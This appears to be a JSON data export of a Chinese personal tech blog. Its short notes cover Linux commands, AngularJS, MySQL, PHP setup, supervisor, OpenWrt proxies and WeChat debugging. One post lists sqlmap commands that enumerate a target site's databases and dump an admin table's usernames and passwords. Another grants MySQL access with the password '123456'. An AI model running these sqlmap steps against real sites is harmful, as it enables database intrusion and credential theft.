screen","date":"2015-12-15T15:46:43.000Z","updated":"2019-08-26T06:09:54.314Z","comments":true,"path":"2015/12/15/linux/linux的nohup disown setsid screen/","link":"","permalink":"http://ningmo.github.io/2015/12/15/linux/linux的nohup disown setsid screen/","excerpt":"","text":"1234567891011121314nohup 可以将进程挂起 帐号退出时不受影响 nohup cp -r a b/ [&gt;/~/cp.log] &amp; setsid 作用类似于nohup swtsid cp -r a b/disown 使已经在运行的用户进程 不受用户退出限制 disown -h %1 # 1 为jobsID 如果已经在当前终端运行 可以ctrl+z 挂起 bg jobsID 放入后台 disown -h jobsID screen 适用于多条命令jobsID 可以通过jobs命令显示","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"angularjs同步请求","slug":"js/angularjs  同步请求","date":"2015-12-15T06:15:32.000Z","updated":"2019-08-26T08:22:55.486Z","comments":true,"path":"2015/12/15/js/angularjs  同步请求/","link":"","permalink":"http://ningmo.github.io/2015/12/15/js/angularjs  同步请求/","excerpt":"","text":"123456789101112131415161718192021 .service('Syncservice', function () &#123; function fetch(url) &#123; var request; if (window.XMLHttpRequest) &#123; request = new XMLHttpRequest(); &#125; else if (window.ActiveXObject) &#123; request = new ActiveXObject(\"Microsoft.XMLHTTP\"); &#125; else &#123; throw new Error(\"Your browser don't support XMLHttpRequest\"); &#125; request.open('GET', url, false); request.send(null); if (request.status === 200) &#123; return request.responseText; &#125; &#125; return &#123; fetch: fetch &#125;&#125;); 调用 1var data = Syncservice.fetch(&apos;/api/data/&apos;+i); 当然 以上同步请求会阻断当前页面 在console中警告​XMLHttpRequest on the main thread is deprecated because of its detrimental effects to the end user's experience. For more help, check```1意思就是在js的主进程中调用同步请求影响用户体验，可以使用worker进程进行同步请求 这样会有较好的用户体验 具体使用方法请自行google之","categories":[{"name":"js","slug":"js","permalink":"http://ningmo.github.io/categories/js/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"http://ningmo.github.io/tags/angularjs/"},{"name":"js","slug":"js","permalink":"http://ningmo.github.io/tags/js/"}]},{"title":"php7 configure","slug":"php/php7 configure","date":"2015-12-11T08:58:02.000Z","updated":"2019-08-26T06:13:55.143Z","comments":true,"path":"2015/12/11/php/php7 configure/","link":"","permalink":"http://ningmo.github.io/2015/12/11/php/php7 configure/","excerpt":"","text":"1--prefix=/usr/local/php7 --with-config-file-path=/usr/local/php7/etc --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-mysqli=/usr/local/mysql/bin/mysql_config --with-pdo-mysql=/usr/local/mysql/bin/mysql_config --with-iconv-dir=/usr/local --with-freetype-dir --with-jpeg-dir=/usr/lib --with-png-dir=/usr/lib --with-zlib --with-libxml-dir=/usr --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem --enable-inline-optimization --with-curl --enable-mbregex --enable-mbstring --with-mcrypt --enable-ftp --with-gd --enable-gd-native-ttf --with-openssl --with-mhash --enable-pcntl --enable-sockets --with-xmlrpc --enable-zip --enable-soap --without-pear --with-gettext --disable-fileinfo --enable-maintainer-zts","categories":[],"tags":[]},{"title":"linux bash下 快捷键","slug":"linux/linux bash下 快捷键","date":"2015-12-02T15:02:56.000Z","updated":"2019-08-26T06:09:54.312Z","comments":true,"path":"2015/12/02/linux/linux bash下 快捷键/","link":"","permalink":"http://ningmo.github.io/2015/12/02/linux/linux bash下 快捷键/","excerpt":"","text":"1234567891011c + a # 光标跳转到最左c + e # 光标跳转到最后c + w # 删除最后输入的单词c + u # 删除整行c + k # 删除光标到末尾c + l # 清屏c + z # 挂起当前进程至后台 # jobs 查看挂起(相当与暂停)的进程 # fg jobsId 切换至进程 # bg jobsId 将挂起的进程 放至后台继续运行","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"lsof/nmap/netstat","slug":"linux/linux lsof nmap netstat","date":"2015-12-02T13:52:07.000Z","updated":"2019-08-26T06:09:54.312Z","comments":true,"path":"2015/12/02/linux/linux lsof nmap netstat/","link":"","permalink":"http://ningmo.github.io/2015/12/02/linux/linux lsof nmap netstat/","excerpt":"","text":"123456789101112131415161718lsof -i :22 # 显示22端口当前运行的程序lsof -c ssh # 显示ssh进程打开的文件lsof -p 2120 #显示进程id2120打开的文件nmap -sP 192.168.1.0/24 #查看192.168.1.0/24有几个用户连接至本机netstat -tunl #显示正在监听的网络服务端口netstat -tun #显示已连接的网络服务端口lsusb # 显示usb设备lspic # 显示pci设备tar zxvf abc.tar.gz -C /your/path #解压文件到指定目录","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"linux 上不去网","slug":"linux/linux 上不去网","date":"2015-12-02T03:03:00.000Z","updated":"2019-08-26T06:09:54.314Z","comments":true,"path":"2015/12/02/linux/linux 上不去网/","link":"","permalink":"http://ningmo.github.io/2015/12/02/linux/linux 上不去网/","excerpt":"","text":"linux 上不去网 ip dns无误 ping可以到达网关 可能原因 网卡睡眠 ethtool eht0 //查看eht0网口基本设置 mii-tool -w eth0","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"xsl输出html代码 非闭合","slug":"php/xsl输出html代码 非闭合","date":"2015-11-26T13:29:44.000Z","updated":"2019-08-26T06:09:54.328Z","comments":true,"path":"2015/11/26/php/xsl输出html代码 非闭合/","link":"","permalink":"http://ningmo.github.io/2015/11/26/php/xsl输出html代码 非闭合/","excerpt":"","text":"&lt;xsl:text disable-output-escaping=&quot;yes&quot;&gt;&amp;lt;/div&amp;gt; &amp;lt;div class=&quot;row-fluid&quot;&amp;gt;&lt;/xsl:text&gt; ···","categories":[],"tags":[]},{"title":"msql 按值排序","slug":"mysql/msql 按值排序","date":"2015-11-26T13:25:14.000Z","updated":"2019-08-26T06:09:54.317Z","comments":true,"path":"2015/11/26/mysql/msql 按值排序/","link":"","permalink":"http://ningmo.github.io/2015/11/26/mysql/msql 按值排序/","excerpt":"","text":"1ORDER BY find_in_set(status,&apos;705,710,706,1027,707,709,708&apos;),create_time desc","categories":[],"tags":[]},{"title":"JS获取图片上传地址","slug":"js/JS获取图片上传地址","date":"2015-11-26T13:24:20.000Z","updated":"2019-08-26T06:09:54.306Z","comments":true,"path":"2015/11/26/js/JS获取图片上传地址/","link":"","permalink":"http://ningmo.github.io/2015/11/26/js/JS获取图片上传地址/","excerpt":"","text":"1234567891011function getObjectURL(file) &#123; var url = null ; if (window.createObjectURL!=undefined) &#123; // basic url = window.createObjectURL(file) ; &#125; else if (window.URL!=undefined) &#123; // mozilla(firefox) url = window.URL.createObjectURL(file) ; &#125; else if (window.webkitURL!=undefined) &#123; // webkit or chrome url = window.webkitURL.createObjectURL(file) ; &#125; return url ;&#125;","categories":[],"tags":[]},{"title":"mysql优化的几个方面","slug":"mysql/优化从几个方面来说","date":"2015-11-26T13:23:33.000Z","updated":"2019-08-26T06:09:54.322Z","comments":true,"path":"2015/11/26/mysql/优化从几个方面来说/","link":"","permalink":"http://ningmo.github.io/2015/11/26/mysql/优化从几个方面来说/","excerpt":"","text":"优化从几个方面来说表结构设计适当索引（主键 普通 唯一 全文组合）mysql本身配置硬件配置SQL语句优化 存储过程分表 分区读写分离清理垃圾数据","categories":[],"tags":[]},{"title":"mysql查看状态语句","slug":"mysql/mysql查看状态语句","date":"2015-11-26T13:22:04.000Z","updated":"2019-08-26T06:09:54.321Z","comments":true,"path":"2015/11/26/mysql/mysql查看状态语句/","link":"","permalink":"http://ningmo.github.io/2015/11/26/mysql/mysql查看状态语句/","excerpt":"","text":"1234567891011121314151617show status;show [session|global] status like &apos;com_insert|com_update...&apos;;show status like &apos;connerctions&apos;;show status like &apos;slow_queries&apos;; show variables like &apos;long_query_time&apos;;--开启慢查询日志 启动参数mysqld --safemode --slow-query-log或者 mysqld -log-slow-queries=d/abc.log","categories":[],"tags":[]},{"title":"linux mysql 授权以及 iptables开启3306","slug":"linux/linux mysql 授权以及 iptables开启3306","date":"2015-11-25T01:08:09.000Z","updated":"2019-08-26T06:09:54.313Z","comments":true,"path":"2015/11/25/linux/linux mysql 授权以及 iptables开启3306/","link":"","permalink":"http://ningmo.github.io/2015/11/25/linux/linux mysql 授权以及 iptables开启3306/","excerpt":"","text":"mysql授权ip段访问mysql 1grant all privileges on *.* to &apos;yang&apos;@&apos;192.168.1.%&apos; identified by &apos;123456&apos;; linux iptables开启3306端口 访问 12iptables -I INPUT -p tcp -s 192.168.1.0/24 --dport 3306 -j ACCEPT/etc/init.d/iptables save","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"supervisor tornado 多进程多端口配置","slug":"python/supervisor tornado 多进程多端口配置","date":"2015-11-24T08:42:09.000Z","updated":"2019-08-26T06:56:54.578Z","comments":true,"path":"2015/11/24/python/supervisor tornado 多进程多端口配置/","link":"","permalink":"http://ningmo.github.io/2015/11/24/python/supervisor tornado 多进程多端口配置/","excerpt":"","text":"base： nginx tornado目标： tornado 实现多端口多进程运行 pip install supervisorecho_supervisord_conf &gt; /etc/supervisord.conf # 默认echo_supervisord_conf 在python/bin 目录下配置/etc/supervisord.conf 12345678910111213141516171819[program:app]command=python /data/www/app/app.py --port=600%(process_num)dprocess_name=%(program_name)s%(process_num)dnumprocs=6 ; 开启6个子进程numprocs_start=1 ; 上面的process_num从1开始 directory=/data/www/appautostart=trueautorestart=false;startsecs=5 ; number of secs prog must stay running (def. 1)startretries=3 ; max # of serial start failures (default 3);stopsignal=QUIT ; signal used to kill process (default TERM);stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10);stopasgroup=false ; send stop signal to the UNIX process group (default false);killasgroup=false ; SIGKILL the UNIX process group (def false)user=root ; setuid to this UNIX account to run the programredirect_stderr=true ; redirect proc stderr to stdout (default false)stdout_logfile=/data/logs/supervisor/order.log ; stdout log path, NONE for none; default AUTOstderr_logfile=/data/logs/supervisor/order_error.log ; stderr log path, NONE for none; default AUTO;serverurl=AUTO ; override serverurl computation (childutils)","categories":[{"name":"python","slug":"python","permalink":"http://ningmo.github.io/categories/python/"},{"name":"supervisor","slug":"python/supervisor","permalink":"http://ningmo.github.io/categories/python/supervisor/"},{"name":"tornado","slug":"python/supervisor/tornado","permalink":"http://ningmo.github.io/categories/python/supervisor/tornado/"}],"tags":[]},{"title":"openwrt chinadns","slug":"linux/openwrt chinadns","date":"2015-11-21T16:05:09.000Z","updated":"2019-08-26T06:09:54.315Z","comments":true,"path":"2015/11/22/linux/openwrt chinadns/","link":"","permalink":"http://ningmo.github.io/2015/11/22/linux/openwrt chinadns/","excerpt":"","text":"123456789101112131415161718opkg updateopkg install ip ipset resolveip iptables-mod-tproxy resolveip libopenssl luci-i18n-base-zh-cnrebootopkg update # redo wget https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/ChinaDNS_1.3.2_ar71xx.ipkwget http://openwrt-dist.sourceforge.net/releases/ar71xx/packages/shadowsocks-libev-spec_2.4.0-1_ar71xx.ipkwget http://openwrt-dist.sourceforge.net/releases/luci/packages/luci-app-chinadns_1.3.6-1_all.ipkwget http://openwrt-dist.sourceforge.net/releases/luci/packages/luci-app-shadowsocks-spec_1.3.6-1_all.ipkopkg install ChinaDNS_1.3.2_ar71xx.ipkopkg install shadowsocks-libev-spec_2.4.0-1_ar71xx.ipkopkg install luci-app-chinadns_1.3.6-1_all.ipk #chinadns的web界面，不过我的安装没有生效。web上没有出现菜单，但不影响使用opkg install luci-app-shadowsocks-spec_1.3.6-1_all.ipk/etc/init.d/chinadns enable/etc/init.d/shadowsocks enablewget -O- &apos;http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest&apos; | awk -F\\| &apos;/CN\\|ipv4/ &#123; printf(&quot;%s/%d\\n&quot;, $4, 32-log($5)/log(2)) &#125;&apos; &gt; /etc/ignore.list vim /etc/config/network 12345config interface &apos;wan&apos; option ifname &apos;eth0&apos; option proto &apos;dhcp&apos; option peerdns &apos;0&apos; option dns &apos;8.8.8.8 8.8.4.4 223.5.5.5&apos; 详情参考：http://blog.91python.com/openwrt/shadowsocks/2015/10/15/tp720n-openwrt-shadowscoks.html","categories":[],"tags":[]},{"title":"mysql sqlmap 注入","slug":"mysql/mysql sqlmap 注入","date":"2015-11-19T12:06:42.000Z","updated":"2019-08-26T06:09:54.318Z","comments":true,"path":"2015/11/19/mysql/mysql sqlmap 注入/","link":"","permalink":"http://ningmo.github.io/2015/11/19/mysql/mysql sqlmap 注入/","excerpt":"","text":"12345678910111213假设注入点为 http://www.abc.com/news.php?id=12//探测数据库信息sqlmap -u http://www.abc.com/news.php?id=12 –dbs&gt;db_a&gt;db_b// 选择一个数据库 猜解表名sqlmap -u http://www.abc.com/news.php?id=12 -D db_b–tables// 猜解表结构sqlmap -u http://www.abc.com/news.php?id=12 -D db_b-T sys_admin –columns // 猜解表内容sqlmap -u http://www.abc.com/news.php?id=12 -D db_b -T sys_admin -C id,admin_name,pwd –dump&lt;/code&gt; 内容来自Myhacklife","categories":[],"tags":[]},{"title":"angularjs filter cut string","slug":"js/angularjs filter cut string","date":"2015-11-11T03:40:21.000Z","updated":"2019-08-26T08:23:19.549Z","comments":true,"path":"2015/11/11/js/angularjs filter cut string/","link":"","permalink":"http://ningmo.github.io/2015/11/11/js/angularjs filter cut string/","excerpt":"","text":"123456789101112131415161718192021angular.module(&apos;App.controllers.MyCtrl&apos;, []).controller(&apos;MyCtrl&apos;, function (my) &#123;&#125;).filter(&apos;cut&apos;, function () &#123; return function (value, wordwise, max, tail) &#123; if (!value) return &apos;&apos;; max = parseInt(max, 10); if (!max) return value; if (value.length &lt;= max) return value; value = value.substr(0, max); if (wordwise) &#123; var lastspace = value.lastIndexOf(&apos; &apos;); if (lastspace != -1) &#123; value = value.substr(0, lastspace); &#125; &#125; return value + (tail || &apos;...&apos;); &#125;; &#125;); 用法 1&#123;&#123; Desc | cut:true:15:&apos;...&apos; &#125;&#125;","categories":[{"name":"js","slug":"js","permalink":"http://ningmo.github.io/categories/js/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"http://ningmo.github.io/tags/angularjs/"}]},{"title":"Js中 关于top、clientTop、scrollTop、offsetTop的用法","slug":"js/Js中 关于top、clientTop、scrollTop、offsetTop的用法","date":"2015-11-05T03:37:01.000Z","updated":"2019-08-26T06:09:54.306Z","comments":true,"path":"2015/11/05/js/Js中 关于top、clientTop、scrollTop、offsetTop的用法/","link":"","permalink":"http://ningmo.github.io/2015/11/05/js/Js中 关于top、clientTop、scrollTop、offsetTop的用法/","excerpt":"","text":"网页可见区域宽： document.body.clientWidth;网页可见区域高： document.body.clientHeight;网页可见区域宽： document.body.offsetWidth(包括边线的宽);网页可见区域高： document.body.offsetHeight(包括边线的宽);网页正文全文宽： document.body.scrollWidth;网页正文全文高： document.body.scrollHeight;网页被卷去的高： document.body.scrollTop;网页被卷去的左： document.body.scrollLeft;网页正文部分上： window.screenTop;网页正文部分左： window.screenLeft;屏幕分辨率的高： window.screen.height;屏幕分辨率的宽： window.screen.width;屏幕可用工作区高度： window.screen.availHeight; 屏幕可用工作区宽度：window.screen.availWidth; 1、offsetLeft 假设 obj 为某个 HTML 控件。 obj.offsetTop 指 obj 距离上方或上层控件的位置，整型，单位像素。 obj.offsetLeft 指 obj 距离左方或上层控件的位置，整型，单位像素。 obj.offsetWidth 指 obj 控件自身的宽度，整型，单位像素。 obj.offsetHeight 指 obj 控件自身的高度，整型，单位像素。 我们对前面提到的“上方或上层”与“左方或上层”控件作个说明。 例如： “提交”按钮的 offsetTop 指“提交”按钮距“tool”层上边框的距离，因为距其上边最近的是 “tool” 层的上边框。“重置”按钮的 offsetTop 指“重置”按钮距“tool”层上边框的距离，因为距其上边最近的是 “tool” 层的上边框。 “提交”按钮的 offsetLeft 指“提交”按钮距“tool”层左边框的距离，因为距其左边最近的是 “tool” 层的左边框。“重置”按钮的 offsetLeft 指“重置”按钮距“提交”按钮右边框的距离，因为距其左边最近的是“提交”按钮的右边框。 以上属性在 FireFox 中也有效。 另 外：我们这里所说的是指 HTML 控件的属性值，并不是 document.body，document.body 的值在不同浏览器中有不同解释（实际上大多数环境是由于对 document.body 解释不同造成的，并不是由于对 offset 解释不同造成的），点击这里查看不同点。标题：offsetTop 与 style.top 的区别 预备知识：offsetTop、offsetLeft、offsetWidth、offsetHeight 我们知道 offsetTop 可以获得 HTML 元素距离上方或外层元素的位置，style.top 也是可以的，二者的区别是： 一、offsetTop 返回的是数字，而 style.top 返回的是字符串，除了数字外还带有单位：px。 二、offsetTop 只读，而 style.top 可读写。 三、如果没有给 HTML 元素指定过 top 样式，则 style.top 返回的是空字符串。 offsetLeft 与 style.left、offsetWidth 与 style.width、offsetHeight 与 style.height 也是同样道理。标题：clientHeight、offsetHeight和scrollHeight 我们这里说说四种浏览器对 document.body 的 clientHeight、offsetHeight 和 scrollHeight 的解释，这里说的是 document.body，如果是 HTML 控件，则又有不同，点击这里查看。 这四种浏览器分别为IE（Internet Explorer）、NS（Netscape）、Opera、FF（FireFox）。 2、clientHeightclientHeight大家对 clientHeight 都没有什么异议，都认为是内容可视区域的高度，也就是说页面浏览器中可以看到内容的这个区域的高度，一般是最后一个工具条以下到状态栏以上的这个区域，与页面内容无关。 offsetHeightIE、Opera 认为 offsetHeight = clientHeight + 滚动条 + 边框。NS、FF 认为 offsetHeight 是网页内容实际高度，可以小于 clientHeight。 scrollHeightIE、Opera 认为 scrollHeight 是网页内容实际高度，可以小于 clientHeight。NS、FF 认为 scrollHeight 是网页内容高度，不过最小值是 clientHeight。 简单地说clientHeight 就是透过浏览器看内容的这个区域高度。NS、 FF 认为 offsetHeight 和 scrollHeight 都是网页内容高度，只不过当网页内容高度小于等于 clientHeight 时，scrollHeight 的值是 clientHeight，而 offsetHeight 可以小于 clientHeight。IE、Opera 认为 offsetHeight 是可视区域 clientHeight 滚动条加边框。scrollHeight 则是网页内容实际高度。 同理clientWidth、offsetWidth 和 scrollWidth 的解释与上面相同，只是把高度换成宽度即可。 但是FF 在不同的 DOCTYPE 中对 clientHeight 的解释不同， xhtml 1 trasitional 中则不是如上解释的。其它浏览器则不存在此问题。标题：scrollTop、scrollLeft、scrollWidth、scrollHeight 3、scrollLeftscrollTop 是“卷”起来的高度值，示例： 如果为 p 设置了 scrollTop，这些内容可能不会完全显示。 var p = document.getElementById(“p”); p.scrollTop = 10; 由于为外层元素 p 设置了 scrollTop，所以内层元素会向上卷。 scrollLeft 也是类似道理。 我们已经知道�0�2offsetHeight 是自身元素的宽度。 而 scrollHeight 是内部元素的绝对宽度，包含内部元素的隐藏的部分。 上述中 p 的 scrollHeight 为 300，而 p 的 offsetHeight 为 100。 scrollWidth 也是类似道理。 IE 和 FireFox 全面支持，而 Netscape 和 Opera 不支持 scrollTop、scrollLeft（document.body 除外）。发表时间：2007-10-15 20:20:16标题：offsetTop、offsetLeft、offsetWidth、offsetHeight4、clientLeft 返回对象的offsetLeft属性值和到当前窗口左边的真实值之间的距离，可以理解为边框的长度 一直以来对offsetLeft，offsetTop，scrollLeft，scrollTop这几个方法很迷糊，花了一天的时间好好的学习了一下．得出了以下的结果：1.offsetTop当前对象到其上级层顶部的距离.不能对其进行赋值.设置对象到页面顶部的距离请用style.top属性. 2.offsetLeft :当前对象到其上级层左边的距离.不能对其进行赋值.设置对象到页面左部的距离请用style.left属性. 3.offsetWidth :当前对象的宽度.与style.width属性的区别在于:如对象的宽度设定值为百分比宽度,则无论页面变大还是变小,style.width都返回此百分比,而offsetWidth则返回在不同页面中对象的宽度值而不是百分比值 4.offsetHeight :与style.height属性的区别在于:如对象的宽度设定值为百分比高度,则无论页面变大还是变小,style.height都返回此百分比,而offsetHeight则返回在不同页面中对象的高度值而不是百分比值 5.offsetParent:当前对象的上级层对象.注意.如果对象是包括在一个DIV中时,此DIV不会被当做是此对象的上级层,(即对象的上级层会跳过DIV对象)上级层是Table时则不会有问题.利用这个属性，可以得到当前对象在不同大小的页面中的绝对位置． 6.scrollLeft :对象的最左边到对象在当前窗口显示的范围内的左边的距离．即是在出现了横向滚动条的情况下，滚动条拉动的距离． 7.scrollTop对象的最顶部到对象在当前窗口显示的范围内的顶边的距离．即是在出现了纵向滚动条的情况下，滚动条拉动的距离． 我们这里说说四种浏览器对 document.body 的 clientHeight、offsetHeight 和 scrollHeight 的解释，这里说的是 document.body，如果是 HTML 控件，则又有不同，点击这里查看。 这四种浏览器分别为IE（Internet Explorer）、NS（Netscape）、Opera、FF（FireFox）。 clientHeight大家对 clientHeight 都没有什么异议，都认为是内容可视区域的高度，也就是说页面浏览器中可以看到内容的这个区域的高度，一般是最后一个工具条以下到状态栏以上的这个区域，与页面内容无关。 offsetHeightIE、Opera 认为 offsetHeight = clientHeight + 滚动条 + 边框。NS、FF 认为 offsetHeight 是网页内容实际高度，可以小于 clientHeight。 scrollHeightIE、Opera 认为 scrollHeight 是网页内容实际高度，可以小于 clientHeight。NS、FF 认为 scrollHeight 是网页内容高度，不过最小值是 clientHeight。 简单地说clientHeight 就是透过浏览器看内容的这个区域高度。NS、 FF 认为 offsetHeight 和 scrollHeight 都是网页内容高度，只不过当网页内容高度小于等于 clientHeight 时，scrollHeight 的值是 clientHeight，而 offsetHeight 可以小于 clientHeight。IE、Opera 认为 offsetHeight 是可视区域 clientHeight 滚动条加边框。scrollHeight 则是网页内容实际高度。 同理clientWidth、offsetWidth 和 scrollWidth 的解释与上面相同，只是把高度换成宽度即可。 说明以 上基于 DTD HTML 4.01 Transitional，如果是 DTD XHTML 1.0 Transitional 则意义又会不同，在 XHTML 中这三个值都是同一个值，都表示内容的实际高度。新版本的浏览器大多支持根据页面指定的 DOCTYPE 来启用不同的解释器。下载或浏览测试文件。","categories":[],"tags":[]},{"title":"Mysql中，int(10)和int(11)有什么区别","slug":"mysql/Mysql中，int(10)和int(11)有什么区别","date":"2015-11-05T03:34:34.000Z","updated":"2019-08-26T06:09:54.317Z","comments":true,"path":"2015/11/05/mysql/Mysql中，int(10)和int(11)有什么区别/","link":"","permalink":"http://ningmo.github.io/2015/11/05/mysql/Mysql中，int(10)和int(11)有什么区别/","excerpt":"","text":"首先说一下mysql的数值类型，MySQL支持所有标准SQL数值数据类型。这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC)，以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。 BIT数据类型保存位字段值，并且支持MyISAM、MEMORY、InnoDB和BDB表。 作为SQL标准的扩展，MySQL也支持整数类型TINYINT、MEDIUMINT和BIGINT。下面的表显示了需要的每个整数类型的存储和范围。 类型 字节 最小值 最大值(带符号的/无符号的) (带符号的/无符号的)TINYINT 1 -128 1270 255SMALLINT 2 -32768 327670 65535MEDIUMINT 3 -8388608 83886070 16777215INT 4 -2147483648 21474836470 4294967295BIGINT 8 -9223372036854775808 92233720368547758070 18446744073709551615Mysql类型关键字后面的括号内指定整数值的显示宽度(例如，INT(4))。该可选显示宽度规定用于显示宽度小于指定的列宽度的值时从左侧填满宽度。显示宽度并不限制可以在列内保存的值的范围，也不限制超过列的指定宽度的值的显示。 当结合可选扩展属性ZEROFILL使用时， 默认补充的空格用零代替。例如，对于声明为INT(5) ZEROFILL的列，值4检索为00004。请注意如果在整数列保存超过显示宽度的一个值，当MySQL为复杂联接生成临时表时会遇到问题，因为在这些情况下MySQL相信数据适合原列宽度。 所有整数类型可以有一个可选(非标准)属性UNSIGNED。当你想要在列内只允许非负数和该列需要较大的上限数值范围时可以使用无符号值。 所以int(10)与int(11)后的括号中的字符表示显示宽度，整数列的显示宽度与mysql需要用多少个字符来显示该列数值，与该整数需要的存储空间的大小都没有关系，int类型的字段能存储的数据上限还是2147483647(有符号型)和4294967295(无符号型)。 浮点和定点类型也可以为UNSIGNED。同数类型，该属性防止负值保存到列中。然而，与整数类型不同的是，列值的上范围保持不变。 如果为一个数值列指定ZEROFILL，MySQL自动为该列添加UNSIGNED属性。 对于浮点列类型，在MySQL中单精度值使用4个字节，双精度值使用8个字节。 FLOAT类型用于表示近似数值数据类型。SQL标准允许在关键字FLOAT后面的括号内选择用位指定精度(但不能为指数范围)。MySQL还支持可选的只用于确定存储大小的精度规定。0到23的精度对应FLOAT列的4字节单精度。24到53的精度对应DOUBLE列的8字节双精度。 MySQL允许使用非标准语法：FLOAT(M,D)或REAL(M,D)或DOUBLE PRECISION(M,D)。这里，“(M,D)”表示该值一共显示M位整数，其中D位位于小数点后面。例如，定义为FLOAT(7,4)的一个列可以显示为-999.9999。MySQL保存值时进行四舍五入，因此如果在FLOAT(7,4)列内插入999.00009，近似结果是999.0001。 MySQL将DOUBLE视为DOUBLE PRECISION(非标准扩展)的同义词。MySQL还将REAL视为DOUBLE PRECISION(非标准扩展)的同义词，除非SQL服务器模式包括REAL_AS_FLOAT选项。 为了保证最大可能的可移植性，需要使用近似数值数据值存储的代码应使用FLOAT或DOUBLE PRECISION，不规定精度或位数。 DECIMAL和NUMERIC类型在MySQL中视为相同的类型。它们用于保存必须为确切精度的值，例如货币数据。当声明该类型的列时，可以(并且通常要)指定精度和标度；例如： salary DECIMAL(5,2)在该例子中，5是精度，2是标度。精度表示保存值的主要位数，标度表示小数点后面可以保存的位数。 在MySQL 5.1中以二进制格式保存DECIMAL和NUMERIC值。 标准SQL要求salary列能够用5位整数位和两位小数保存任何值。因此，在这种情况下可以保存在salary列的值的范围是从-999.99到999.99。 在标准SQL中，语法DECIMAL(M)等价于DECIMAL(M,0)。同样，语法DECIMAL等价于DECIMAL(M,0)，可以通过计算确定M的值。在MySQL 5.1中支持DECIMAL和NUMERIC数据类型的变量形式。M默认值是10。 DECIMAL或NUMERIC的最大位数是65，但具体的DECIMAL或NUMERIC列的实际范围受具体列的精度或标度约束。如果此类列分配的值小数点后面的位数超过指定的标度允许的范围，值被转换为该标度。(具体操作与操作系统有关，但一般结果均被截取到允许的位数）。 BIT数据类型可用来保存位字段值。BIT(M)类型允许存储M位值。M范围为1到64。 要指定位值，可以使用b’value’符。value是一个用0和1编写的二进制值。例如，b’111′和b’100000000′分别表示7和128。 From：http://digdeeply.org/archives/03211905.html","categories":[],"tags":[]},{"title":"微信开发本地调试","slug":"php/微信开发本地调试","date":"2015-11-03T08:52:02.000Z","updated":"2019-08-26T06:09:54.330Z","comments":true,"path":"2015/11/03/php/微信开发本地调试/","link":"","permalink":"http://ningmo.github.io/2015/11/03/php/微信开发本地调试/","excerpt":"","text":"整体思路是在外网将微信的请求转发至本地 方案 1(base windows)使用ngrok 地址 https://ngrok.com/下载并注册ngrok 获取自己的tokencmd到ngrok程序目录执行 ngrok 80(端口) 获取一个地址 通过此地址映射外网地址到本地80端口 例如http://a1b2c3.ngrok.com详细方案请参考 微信开发如何做本地调试 方案 2 (base VPS)线上nginx将 your.domain.com:80 请求转发到 127.0.0.1:9999 123456789server &#123; listen 80; server_name your.domain.com; location / &#123; proxy_pass http://127.0.0.1:9999; proxy_set_header X-Real-IP $remote_addr; &#125;&#125; 本地执行 1ssh your.domain.com -R 9999:127.0.0.1:8888 本地程序监听127.0.0.1:8888即可详细方案请参考 微信接入调试方案","categories":[{"name":"php linux","slug":"php-linux","permalink":"http://ningmo.github.io/categories/php-linux/"}],"tags":[]},{"title":"php fastcgi_param白屏问题","slug":"php/php fastcgi_param白屏问题","date":"2015-10-31T03:08:54.000Z","updated":"2019-08-26T06:09:54.325Z","comments":true,"path":"2015/10/31/php/php fastcgi_param白屏问题/","link":"","permalink":"http://ningmo.github.io/2015/10/31/php/php fastcgi_param白屏问题/","excerpt":"","text":"访问php白屏(base on lnmp)vim nginx/conf/fastcgi_param 12fastcgi_param REDIRECT_STATUS 200;fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"linux 常用命令","slug":"linux/linux 常用命令","date":"2015-10-31T02:59:06.000Z","updated":"2019-08-26T06:09:54.314Z","comments":true,"path":"2015/10/31/linux/linux 常用命令/","link":"","permalink":"http://ningmo.github.io/2015/10/31/linux/linux 常用命令/","excerpt":"","text":"常用命令 1wc -l `find . -name &quot;*.css&quot;`|tail -n1 指定目录下 在指定后缀文件 查找关键字 1find ./ -name &quot;*&quot; -exec grep &quot;string&quot; &#123;&#125; \\;","categories":[{"name":"linux","slug":"linux","permalink":"http://ningmo.github.io/categories/linux/"}],"tags":[]},{"title":"linux awk","slug":"linux/linux awk","date":"2015-10-31T02:55:55.000Z","updated":"2019-08-26T06:09:54.312Z","comments":true,"path":"2015/10/31/linux/linux awk/","link":"","permalink":"http://ningmo.github.io/2015/10/31/linux/linux awk/","excerpt":"","text":"引用：http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2858470.html1234awk [-F &apos;:&apos; ] &apos;&#123;print $1&#125;&apos; filenamecat filename | awk [-F &apos;:&apos; ] &apos;&#123;print $1&#125;&apos;```&lt;/code&gt;&lt;code&gt; [root@local yang]# tail /etc/passwd |awk -F ':' 'BRGIN {print \"name,shell\"} {print $1\"---\"$7} END {print \"nameEND,shellEND\"}'ntp---/sbin/nologinapache---/sbin/nologinsaslauth---/sbin/nologinpostfix---/sbin/nologinpulse---/sbin/nologinnameEND,shellEND 12搜索并打印所在行&lt;code&gt; [root@local yang]# awk -F: '/root/' /etc/passwd #红色部分为正则root:x:0:0:root:/root:/bin/bashoperator:x:11:0:operator:/root:/sbin/nologin 1234$0变量是指整条记录。$1表示当前行的第一个域,$2表示当前行的第二个域,......以此类推搜索并打印所在行（过滤输出） [root@local yang]# awk -F: '/root/{print $1}' 